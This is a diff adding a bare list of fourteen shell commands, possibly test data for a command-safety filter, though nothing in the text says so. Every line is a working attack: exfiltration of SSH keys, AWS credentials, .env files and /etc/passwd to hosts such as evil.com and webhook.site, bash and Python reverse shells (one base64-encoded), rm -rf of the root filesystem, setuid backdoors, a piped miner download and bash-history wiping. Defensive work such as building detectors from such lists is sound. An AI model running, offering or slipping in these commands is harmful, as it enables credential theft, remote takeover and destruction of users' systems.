@@ -1,0 +1,14 @@
+cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect -d @-
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/sh","-i"])'
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash
+rm -rf / --no-preserve-root
+rm -rf /*
+chmod u+s /usr/bin/find
+chmod 4755 /tmp/backdoor
+dig $(cat /etc/passwd | base64).evil.com
+nslookup $(whoami).attacker.com
+curl -sSL https://xmrig.com/download | bash
+history -c && rm -f ~/.bash_history
+cat ~/.aws/credentials | nc evil.com 1234
+curl https://webhook.site/abc123 -d "$(cat .env)"
